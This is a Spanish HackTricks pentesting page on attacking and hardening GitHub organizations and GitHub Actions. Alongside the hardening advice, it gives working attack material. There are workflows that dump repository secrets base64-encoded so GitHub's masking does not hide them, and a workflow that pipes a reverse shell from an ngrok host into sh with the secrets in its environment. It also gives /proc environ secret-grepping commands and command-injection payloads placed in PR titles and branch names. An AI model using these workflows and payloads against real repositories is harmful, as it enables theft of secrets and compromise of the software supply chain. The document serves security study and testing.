# Seguridad en Github

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén [**productos oficiales de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>

## ¿Qué es Github?

(De [aquí](https://kinsta.com/knowledgebase/what-is-github/)) A grandes rasgos, **Github es un sitio web y un servicio basado en la nube que ayuda a los desarrolladores a almacenar y gestionar su código, así como a realizar un seguimiento y controlar los cambios en su código**.

### Información básica

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## Reconocimiento externo

Los repositorios de Github pueden configurarse como públicos, privados e internos.

* **Privado** significa que solo las personas de la **organización** podrán acceder a ellos.
* **Interno** significa que solo las personas de la **empresa** (una empresa puede tener varias organizaciones) podrán acceder a él.
* **Público** significa que **todo Internet** podrá acceder a él.

En caso de que conozcas el **usuario, repositorio u organización que deseas atacar**, puedes utilizar **dorks de Github** para encontrar información sensible o buscar **filtraciones de información sensible en cada repositorio**.

### Dorks de Github

Github permite **buscar algo especificando como alcance un usuario, un repositorio o una organización**. Por lo tanto, con una lista de cadenas que van a aparecer cerca de información sensible, puedes buscar fácilmente información sensible potencial en tu objetivo.

Herramientas (cada herramienta contiene su lista de dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Lista de dorks](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Lista de dorks](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Lista de dorks](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Filtraciones de Github

Ten en cuenta que los dorks de Github también se utilizan para buscar filtraciones utilizando las opciones de búsqueda de Github. Esta sección está dedicada a las herramientas que **descargarán cada repositorio y buscarán información sensible en ellos** (incluso verificando cierta profundidad de commits).

Herramientas (cada herramienta contiene su lista de expresiones regulares):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

{% hint style="warning" %}
Cuando busques filtraciones en un repositorio y ejecutes algo como `git log -p`, ¡no olvides que puede haber **otras ramas con otros commits** que contengan secretos!
{% endhint %}

### Forks externos

Es posible **comprometer repositorios abusando de las solicitudes de extracción**. Para saber si un repositorio es vulnerable, en su mayoría necesitas leer las configuraciones yaml de las acciones de Github. [**Más información sobre esto a continuación**](./#execution-from-a-external-fork).

## Fortalecimiento de la organización

### Privilegios de los miembros

Existen algunos **privilegios predeterminados** que se pueden asignar a los **miembros** de la organización. Estos se pueden controlar desde la página `https://github.com/organizations/<org_name>/settings/member_privileges` o desde la [**API de Organizaciones**](https://docs.github.com/en/rest/orgs/orgs).

* **Permisos base**: Los miembros tendrán los permisos Ninguno/Lectura/Escritura/Administrador sobre los repositorios de la organización. Se recomienda utilizar **Ninguno** o **Lectura**.
* **Creación de repositorios bifurcados**: Si no es necesario, es mejor **no permitir** a los miembros bifurcar los repositorios de la organización.
* **Creación de páginas**: Si no es necesario, es mejor **no permitir** a los miembros publicar páginas desde los repositorios de la organización. Si es necesario, puedes permitir crear páginas públicas o privadas.
* **Solicitudes de acceso a integraciones**: Con esto habilitado, los colaboradores externos podrán solicitar acceso a aplicaciones de GitHub o OAuth para acceder a esta organización y sus recursos. Por lo general, es necesario, pero si no lo es, es mejor deshabilitarlo.
* _No pude encontrar esta información en la respuesta de las APIs, compártela si la encuentras_
* **Cambio de visibilidad del repositorio**: Si está habilitado, los **miembros** con permisos de **administrador** para el **repositorio** podrán **cambiar su visibilidad**. Si está deshabilitado, solo los propietarios de la organización pueden cambiar la visibilidad de los repositorios. Si **no** quieres que las personas hagan cosas **públicas**, asegúrate de que esto esté **deshabilitado**.
* _No pude encontrar esta información en la respuesta de las APIs, compártela si la encuentras_
* **Eliminación y transferencia de repositorios**: Si está habilitado, los miembros con permisos de **administrador** para el repositorio podrán **eliminar** o **transferir** repositorios **públicos** y **privados**.
* _No pude encontrar esta información en la respuesta de las APIs, compártela si la encuentras_
* **Permitir a los miembros crear equipos**: Si está habilitado, cualquier **miembro** de la organización podrá **crear** nuevos **equipos**. Si está deshabilitado, solo los propietarios de la organización pueden crear nuevos equipos. Es mejor tener esto deshabilitado.
* _No pude encontrar esta información en la respuesta de las APIs, compártela si la encuentras_
* **Se pueden configurar más cosas** en esta página, pero las anteriores son las más relacionadas con la seguridad.
### Configuración de acciones

Se pueden configurar varias opciones relacionadas con la seguridad para las acciones desde la página `https://github.com/organizations/<org_name>/settings/actions`.

{% hint style="info" %}
Ten en cuenta que todas estas configuraciones también se pueden establecer en cada repositorio de forma independiente.
{% endhint %}

* **Políticas de acciones de Github**: Te permite indicar qué repositorios pueden ejecutar flujos de trabajo y qué flujos de trabajo deben permitirse. Se recomienda **especificar qué repositorios** deben permitirse y no permitir que se ejecuten todas las acciones.
* [**API-1**](https://docs.github.com/en/rest/actions/permissions#get-allowed-actions-and-reusable-workflows-for-an-organization)**,** [**API-2**](https://docs.github.com/en/rest/actions/permissions#list-selected-repositories-enabled-for-github-actions-in-an-organization)
* **Flujos de trabajo de solicitudes de extracción de bifurcación de colaboradores externos**: Se recomienda **requerir aprobación para todos** los colaboradores externos.
* _No pude encontrar una API con esta información, compártela si la encuentras_
* **Ejecutar flujos de trabajo desde solicitudes de extracción de bifurcación**: Se desaconseja encarecidamente **ejecutar flujos de trabajo desde solicitudes de extracción** ya que los mantenedores del origen de la bifurcación podrán utilizar tokens con permisos de lectura en el repositorio fuente.
* _No pude encontrar una API con esta información, compártela si la encuentras_
* **Permisos de flujo de trabajo**: Se recomienda encarecidamente **solo otorgar permisos de lectura del repositorio**. Se desaconseja otorgar permisos de escritura y crear/aprobar solicitudes de extracción para evitar el abuso del GITHUB\_TOKEN otorgado a los flujos de trabajo en ejecución.
* [**API**](https://docs.github.com/en/rest/actions/permissions#get-default-workflow-permissions-for-an-organization)

### Integraciones

_¡Avísame si conoces el punto final de la API para acceder a esta información!_

* **Política de acceso de aplicaciones de terceros**: Se recomienda restringir el acceso a todas las aplicaciones y permitir solo las necesarias (después de revisarlas).
* **Aplicaciones de GitHub instaladas**: Se recomienda permitir solo las necesarias (después de revisarlas).

## Reconocimiento y ataques abusando credenciales

Para este escenario, supongamos que has obtenido acceso a una cuenta de GitHub.

### Con credenciales de usuario

Si de alguna manera ya tienes las credenciales de un usuario dentro de una organización, simplemente puedes **iniciar sesión** y verificar qué **roles de empresa y organización tienes**, si eres un miembro básico, verifica qué **permisos tienen los miembros básicos**, en qué **grupos** estás, qué **permisos tienes** sobre qué **repositorios** y **cómo están protegidos los repositorios**.

Ten en cuenta que se puede utilizar **autenticación de dos factores (2FA)**, por lo que solo podrás acceder a esta información si también puedes **superar esa verificación**.

{% hint style="info" %}
Ten en cuenta que si logras **robar la cookie `user_session`** (actualmente configurada con SameSite: Lax), puedes **suplantar completamente al usuario** sin necesidad de credenciales o 2FA.
{% endhint %}

Consulta la sección a continuación sobre [**bypass de protecciones de rama**](./#branch-protection-bypass) en caso de que sea útil.

### Con clave SSH de usuario

Github permite a los **usuarios** configurar **claves SSH** que se utilizarán como **método de autenticación para implementar código** en su nombre (no se aplica 2FA).

Con esta clave, puedes realizar **cambios en los repositorios donde el usuario tiene algunos privilegios**, sin embargo, no puedes usarla para acceder a la API de GitHub para enumerar el entorno. Sin embargo, puedes **enumerar la configuración local** para obtener información sobre los repositorios y el usuario a los que tienes acceso:
```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```
Si el usuario ha configurado su nombre de usuario como su nombre de usuario de GitHub, puedes acceder a las **claves públicas que ha configurado** en su cuenta en _https://github.com/\<github\_username>.keys_, puedes verificar esto para confirmar que la clave privada que encontraste se puede utilizar.

Las **claves SSH** también se pueden configurar en los repositorios como **claves de implementación**. Cualquier persona con acceso a esta clave podrá **lanzar proyectos desde un repositorio**. Por lo general, en un servidor con diferentes claves de implementación, el archivo local **`~/.ssh/config`** te dará información sobre qué clave está relacionada.

#### Claves GPG

Como se explica [**aquí**](broken-reference/), a veces es necesario firmar los commits o podrías ser descubierto.

Verifica localmente si el usuario actual tiene alguna clave con:
```shell
gpg --list-secret-keys --keyid-format=long
```
### Con Token de Usuario

Para obtener una introducción sobre [**Tokens de Usuario, consulta la información básica**](basic-github-information.md#personal-access-tokens).

Un token de usuario se puede utilizar **en lugar de una contraseña** para Git a través de HTTPS, o se puede utilizar para [**autenticarse en la API mediante autenticación básica**](https://docs.github.com/v3/auth/#basic-authentication). Dependiendo de los privilegios asociados a él, es posible realizar diferentes acciones.

Un token de usuario se ve así: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### Con Aplicación Oauth

Para obtener una introducción sobre [**Aplicaciones Oauth de Github, consulta la información básica**](basic-github-information.md#oauth-applications).

Un atacante podría crear una **Aplicación Oauth maliciosa** para acceder a datos/acciones privilegiados de los usuarios que los acepten, probablemente como parte de una campaña de phishing.

Estos son los [alcances que una aplicación Oauth puede solicitar](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). Siempre se debe verificar los alcances solicitados antes de aceptarlos.

Además, como se explica en la información básica, **las organizaciones pueden otorgar/denegar acceso a aplicaciones de terceros** a información/repositorios/acciones relacionadas con la organización.

### Con Aplicación de Github

Para obtener una introducción sobre [**Aplicaciones de Github, consulta la información básica**](basic-github-information.md#github-applications).

Un atacante podría crear una **Aplicación de Github maliciosa** para acceder a datos/acciones privilegiados de los usuarios que los acepten, probablemente como parte de una campaña de phishing.

Además, como se explica en la información básica, **las organizaciones pueden otorgar/denegar acceso a aplicaciones de terceros** a información/repositorios/acciones relacionadas con la organización.

## Abusando de Github Action

Para obtener una introducción sobre [**Github Actions, consulta la información básica**](basic-github-information.md#github-actions).

En caso de que puedas **ejecutar acciones de Github arbitrarias** en un **repositorio**, puedes **robar las credenciales secretas de ese repositorio**.

### Ejecución desde la Creación del Repositorio

Si los miembros de una organización pueden **crear nuevos repositorios** y tú puedes ejecutar acciones de Github, puedes **crear un nuevo repositorio y robar las credenciales secretas establecidas a nivel de organización**.

### Ejecución desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Acción de Github** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acción desde la nueva rama**. De esta manera, puedes **filtrar las credenciales secretas del repositorio y de la organización** (pero necesitas saber cómo se llaman).

Puedes hacer que la acción modificada sea ejecutable **manualmente**, cuando se crea una **solicitud de extracción (PR)** o cuando se **envía código** (dependiendo de cuánto ruido quieras hacer):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
### Ejecución desde un Fork Externo

Si un repositorio está utilizando acciones de GitHub, un atacante podría ser capaz de **crear una Pull Request desde un repositorio bifurcado** inyectando **código malicioso** en el **flujo de trabajo** de GitHub, y podría ser capaz de **comprometer el repositorio de GitHub** de esa manera.

#### `pull_request`

El desencadenador del flujo de trabajo **`pull_request`** por defecto **evita los permisos de escritura** y el acceso a secretos en el repositorio objetivo. Además, por defecto, si es la **primera vez** que estás **colaborando**, algún **mantenedor** deberá **aprobar** la **ejecución** del flujo de trabajo:

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Dado que la limitación por defecto es para los colaboradores de **primera vez**, podrías contribuir **solucionando un error válido** y luego enviar **otras Pull Requests para abusar de tus nuevos privilegios de `pull_request`**.

**Probé esto y no funciona**: ~~Otra opción sería crear una cuenta con el nombre de alguien que contribuyó al proyecto y eliminó su cuenta.~~
{% endhint %}

Sin embargo, para **prevenir** la **comprometación** del **repositorio** a través de **`pull_request`**, esto se menciona en la [**documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con la excepción de `GITHUB_TOKEN`, **los secretos no se pasan al runner** cuando se desencadena un flujo de trabajo desde un repositorio bifurcado. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en las Pull Requests **desde repositorios bifurcados**.

Un atacante podría modificar la definición de la Acción de GitHub para ejecutar cosas arbitrarias y agregar acciones arbitrarias. Sin embargo, no podrá robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

Sin embargo, incluso si la acción no menciona Artefactos, ¿podría ser capaz de modificar un Artefacto del repositorio cambiando la acción?? (TODO).

{% hint style="danger" %}
**Sí, si el atacante cambia en la Pull Request la acción de GitHub que se desencadenará, su Acción de GitHub será la que se utilizará y no la del repositorio original.**
{% endhint %}

_Sin embargo, el envío de una nueva acción que se desencadena en pull\_request no se desencadenará._

#### **`pull_request_target`**

Sin embargo, el desencadenador del flujo de trabajo **`pull_request_target`** tiene **permisos de escritura** en el repositorio objetivo y **acceso a secretos** (y no solicita permiso).

Ten en cuenta que el desencadenador del flujo de trabajo **`pull_request_target`** se **ejecuta en el contexto base** y no en el proporcionado por la PR (para no ejecutar código no confiable). Para obtener más información sobre `pull_request_target`, [**consulta la documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Además, para obtener más información sobre este uso peligroso específico, consulta esta [**publicación de blog de GitHub**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Puede parecer que debido a que el flujo de trabajo **ejecutado** es el definido en la **base** y no en la PR, es **seguro** utilizar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

#### Inyección de Script a través de variables controladas por el atacante

GitHub establece [variables de entorno por defecto](https://docs.github.com/en/actions/learn-github-actions/environment-variables) y si se utilizan contextos, [incluye más](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context). Si alguno de esos **valores** se utiliza en un **lugar peligroso** dentro del flujo de trabajo y puede ser **controlado por el atacante**, podría ocurrir una **inyección de comandos**.\
Esta vulnerabilidad también se [**explica más adelante en esta publicación**](./#understanding-the-risk-of-script-injections).

#### Ejecución de checkout no confiable

Si la víctima está utilizando **`pull_request`** o similar para desencadenar la acción, no se aceptará ninguna PR de un fork **hasta que sea aprobada específicamente**. La acción luego se ejecutará en el contexto de la PR (lo cual es bueno porque significa que ejecutará el código dentro del fork de las PR), pero **alguien debe aprobarla primero**.

Si la víctima configuró el checkout para usar explícitamente el desencadenador **`pull_request_target`**, siempre se ejecutará, pero utilizando el código del repositorio base (no el de la PR), por lo que el atacante no puede controlar el código ejecutado.\
Sin embargo, si la acción tiene un checkout explícito de la PR que obtendrá el código de la PR (y no de la base), utilizará el código controlado por el atacante. Por ejemplo (ver línea 12 donde se descarga el código de la PR):
```yaml
# INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}

- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
```
El código potencialmente **no confiable se ejecuta durante `npm install` o `npm build`** como scripts de construcción y paquetes de referencia controlados por el autor de la PR.

{% hint style="danger" %}
Si la acción se ejecuta en un runner autohospedado, el atacante podría comprometer aún más el entorno.
{% endhint %}

Un dork de Github para buscar acciones vulnerables es: `event.pull_request pull_request_target extension:yml`, sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura, incluso si la acción está configurada de manera insegura (como usar condicionales sobre quién es el actor que genera la PR).

### Inyección/Puerta trasera de Github Action

En caso de que de alguna manera logres **infiltrarte en una Github Action**, si puedes escalar privilegios, puedes **robar secretos de los procesos donde se han establecido**. En algunos casos, ni siquiera necesitas escalar privilegios.
```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```
### Acceso de Github Action a AWS y GCP a través de OIDC

Consulte las siguientes páginas:

{% content-ref url="../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Información sensible en los registros de Github Actions

Incluso si **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podrían haberse generado durante la ejecución de la acción no se ocultarán. Por ejemplo, un JWT firmado con un valor secreto no se ocultará a menos que se [configure específicamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### GITHUB\_TOKEN

Este "**secreto**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se otorga cuando el administrador habilita esta opción:

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que utilizará una **Aplicación de Github**, por lo que puede acceder a los mismos puntos finales: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github debería lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que **permita el acceso entre repositorios** dentro de GitHub, para que un repositorio pueda acceder a otros repositorios internos utilizando el `GITHUB_TOKEN`.
{% endhint %}

Puede ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Tenga en cuenta que el token **caduca después de que se haya completado el trabajo**.\
Estos tokens se ven así: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puede hacer con este token:
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podrás encontrar **tokens de usuario de Github dentro de las variables de entorno de las acciones de Github o en los secretos**. Estos tokens pueden otorgarte más privilegios sobre el repositorio y la organización.
{% endhint %}

#### Listar secretos en la salida de Github Actions
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
#### Obtener una shell inversa con secretos

En algunos casos, durante una prueba de penetración, es posible obtener una shell inversa utilizando secretos. Esto puede ser útil para acceder de forma remota a un sistema comprometido y ejecutar comandos en él.

Para lograr esto, primero debemos identificar los secretos almacenados en el sistema objetivo. Estos secretos pueden incluir contraseñas, claves de API, tokens de acceso, entre otros. Una forma común de encontrar estos secretos es buscar en archivos de configuración, variables de entorno y otros lugares donde puedan estar almacenados.

Una vez que hayamos identificado los secretos, podemos utilizarlos para establecer una conexión de shell inversa. Esto implica configurar un servidor en nuestra máquina y hacer que el sistema objetivo se conecte a él. Para lograr esto, podemos utilizar herramientas como Netcat o Meterpreter.

Es importante tener en cuenta que obtener una shell inversa utilizando secretos puede ser una actividad ilegal si no se cuenta con el permiso adecuado. Siempre debemos realizar pruebas de penetración en entornos controlados y con el consentimiento del propietario del sistema.

Recuerda que la seguridad es fundamental y debemos utilizar nuestros conocimientos de hacking de manera ética y responsable.
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
### Inyecciones de Script <a href="#comprendiendo-el-riesgo-de-las-inyecciones-de-script" id="comprendiendo-el-riesgo-de-las-inyecciones-de-script"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea la PR. Si la acción de github está utilizando esos **datos para ejecutar cualquier cosa**, podría llevar a una **ejecución de código arbitrario**. Estos contextos suelen terminar con `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` y `title`. Por ejemplo (lista de este [**artículo**](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)):

* github.event.comment.body
* github.event.issue.body
* github.event.issue.title
* github.head\_ref
* github.pull\_request.\*
* github.\*.\*.authors.name
* github.\*.\*.authors.email

Tenga en cuenta que hay **fuentes menos obvias** de entrada potencialmente no confiable, como los nombres de las ramas y las direcciones de correo electrónico, que pueden ser **bastante flexibles en cuanto a su contenido permitido**. Por ejemplo, `zzz";echo${IFS}"hello";#` sería un nombre de rama válido y podría ser un posible vector de ataque para un repositorio objetivo.

#### Ejemplo de un ataque de inyección de script <a href="#ejemplo-de-un-ataque-de-inyección-de-script" id="ejemplo-de-un-ataque-de-inyección-de-script"></a>

Un ataque de inyección de script puede ocurrir directamente dentro del script en línea de un flujo de trabajo. En el siguiente ejemplo, una acción utiliza una **expresión para probar la validez del título de una pull request**, pero también agrega el riesgo de inyección de script:
```yaml
- name: Check PR title
run: |
title="${{ github.event.pull_request.title }}"
if [[ $title =~ ^octocat ]]; then
echo "PR title starts with 'octocat'"
exit 0
else
echo "PR title did not start with 'octocat'"
exit 1
fi
```
Antes de que se ejecute el script de shell, las expresiones dentro de `${{ }}` se **evalúan** y luego se sustituyen por los valores resultantes, lo que puede hacerlo **vulnerable a la inyección de comandos de shell**.

Para inyectar comandos en este flujo de trabajo, el atacante podría crear una solicitud de extracción con un título de `a"; ls $GITHUB_WORKSPACE"`:

![Ejemplo de inyección de script en el título de la PR](https://docs.github.com/assets/cb-24920/images/help/images/example-script-injection-pr-title.png)

En este ejemplo, el carácter `"` se utiliza para interrumpir la declaración `title="${{ github.event.pull_request.title }}"`, lo que permite que se ejecute el comando `ls` en el runner. Puedes ver la salida del comando `ls` en el registro:

![Ejemplo del resultado de la inyección de script](https://docs.github.com/assets/cb-28350/images/help/images/example-script-injection-result.png)

### Acceso a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si estás inyectando contenido en un script, es interesante saber cómo puedes acceder a los secretos:

* Si el secreto o token se establece como una **variable de entorno**, se puede acceder directamente a través del entorno utilizando **`printenv`**.
* Si el secreto se utiliza **directamente en una expresión**, el script de shell generado se almacena en disco y es accesible.
* Para una **acción personalizada**, el riesgo puede variar según cómo un programa esté utilizando el secreto que obtuvo del **argumento**:

```
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuso de runners autohospedados

La forma de encontrar qué **Acciones de Github se están ejecutando en infraestructura no relacionada con Github** es buscar `runs-on: self-hosted` en la configuración yaml de la Acción de Github.

Los runners **autohospedados** pueden tener acceso a **información extra sensible**, a otros **sistemas de red** (¿puntos finales vulnerables en la red? ¿servicio de metadatos?) o, incluso si está aislado y destruido, **más de una acción podría ejecutarse al mismo tiempo** y la maliciosa podría **robar los secretos** de la otra.

### Envenenamiento de caché

Usar la acción de Git [**action/cache**](https://github.com/actions/cache) en cualquier CI ejecutará dos pasos: un paso se llevará a cabo durante el proceso de **ejecución** cuando se llama y el otro se llevará a cabo después del **flujo de trabajo** (si la acción de ejecución devolvió un cache-miss).

* **Acción de ejecución** - se utiliza para buscar y recuperar la caché. La búsqueda se realiza utilizando la clave de caché, y el resultado puede ser un cache-hit (éxito, datos encontrados en la caché) o un cache-miss. Si se encuentra, los archivos y directorios se recuperan de la caché para su uso activo. Si el resultado es un cache-miss, los archivos y directorios deseados se descargan como si fuera la primera vez que se llaman.
* **Acción posterior al flujo de trabajo** - se utiliza para guardar la caché. Si el resultado de la llamada a la caché en la acción de ejecución devuelve un cache-miss, esta acción guardará el estado actual de los directorios que queremos cachear con la clave proporcionada. Esta acción se realiza automáticamente y no necesita ser llamada explícitamente.

Las **restricciones de acceso** proporcionan **aislamiento de caché** y seguridad al crear un **límite lógico entre diferentes ramas** _(por ejemplo: una caché creada para la rama **Feature-A** \[con la base principal] no sería accesible para una solicitud de extracción de la rama **Feature-B** \[con la base principal])_.

La acción de caché primero busca aciertos de caché para una clave y restaura las claves en la rama que contiene la **ejecución del flujo de trabajo**. Si no hay aciertos en la rama actual, la acción de caché busca la clave y restaura las claves en la rama principal y las ramas ascendentes.

El acceso a una caché está limitado por la rama (actual y principal), lo que significa que se proporciona acceso a todos los **flujos de trabajo** en todas las **ejecuciones** de dicha rama.

Otra nota importante es que GitHub no permite modificaciones una vez que se han enviado las entradas: las entradas de caché son registros de solo lectura.

Utilizamos un ejemplo de CI que incluía dos flujos de trabajo. Este ejemplo muestra cómo un ataque puede pasar de un flujo de trabajo de baja permisos a uno de alta permisos.

* Flujo de trabajo de **prueba unitaria** que ejecuta pruebas unitarias y herramientas de cobertura de código. Suponemos que una de las herramientas es maliciosa o vulnerable a la ejecución remota de código. El flujo de trabajo no necesita utilizar la acción de Git **action/cache**. Cualquier flujo de trabajo puede acceder a la caché.
* Flujo de trabajo de **lanzamiento** que construye y lanza el artefacto de la aplicación. Este flujo de trabajo utiliza una caché para optimizar el uso de las dependencias de Golang.

El flujo de trabajo de **prueba unitaria** utiliza una acción maliciosa que agrega una entrada de caché con contenido malicioso al cambiar una biblioteca de registro de Golang (**go.uber.org/zap@v1**) para agregar la cadena 'BAD library' a la descripción del artefacto de la aplicación.

A continuación, el flujo de trabajo de **lanzamiento** utiliza esta entrada de caché envenenada. Como resultado, el código malicioso se inyecta en el binario y la imagen de Golang construidos. La caché permanece envenenada hasta que se descarta la clave de entrada (generalmente desencadenada por actualizaciones de dependencias). La misma caché envenenada afectará a cualquier otro **flujo de trabajo**, **ejecución** y **rama secundaria** que utilice la misma clave de caché.

En la prueba que realizamos, logramos inyectar la cadena 'BAD library' en la descripción de la imagen:

![BAD library](https://scribesecurity.com/wp-content/uploads/2022/02/BAD-library-2-300x79.jpg)

Esto fue en la versión 0.4.1. A continuación, actualizamos la etiqueta y reconstruimos la imagen varias veces, y observamos que 'Bad library' permaneció en la descripción.

Esta técnica se tomó de [https://scribesecurity.com/blog/github-cache-poisoning/](https://scribesecurity.com/blog/github-cache-poisoning/)

### Envenenamiento de artefactos

Existen varias Acciones de Github que permiten **descargar artefactos de otros repositorios**. Estos otros repositorios generalmente tendrán una Acción de Github para **subir el artefacto** que luego se descargará.

Si la **Acción de Github** del repositorio que carga el artefacto permite el uso de **`pull_request`** o **`pull_request_target`** (usando el código del atacante), un atacante podrá activar la Acción que cargará un Artefacto creado a partir de su código, por lo que cualquier otro repositorio que descargue y ejecute el último artefacto quedará comprometido.

{% hint style="info" %}
Como se mencionó en una sección de esta publicación, **`pull_requests`** generalmente requerirá una **aprobación manual** de un mantenedor del repositorio.
{% endhint %}

Ejemplo de **descarga de artefacto desde un repositorio diferente**:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Como se mencionó anteriormente, en un desencadenador de **`pull_request`**, la Acción definida en la PR es la que se ejecuta. Por lo tanto, un **atacante** podría **definir** allí la **carga del artefacto** que le gustaría comprometer.

Por lo tanto, un atacante no necesita atacar un desencadenador de **`pull_request`** en la acción de carga del artefacto, sino simplemente cualquier desencadenador de **`pull_request`**.
{% endhint %}

